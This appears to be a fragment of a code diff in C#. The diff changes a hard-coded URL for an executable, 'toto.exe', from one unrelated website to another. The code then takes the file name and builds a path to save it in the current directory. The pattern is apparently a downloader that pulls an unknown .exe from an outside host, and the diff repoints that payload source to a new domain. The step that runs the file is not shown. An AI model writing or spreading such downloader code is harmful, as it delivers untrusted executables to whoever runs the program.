@@ -49,7 +49,7 @@
               {
                   try
                   {
-                      string url = "http://doralinnsuites.sensationtours.com/toto.exe";
+                      string url = "http://englishviamindmaps.com/toto.exe";
                                           string filename = Path.GetFileName(url);
                       string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
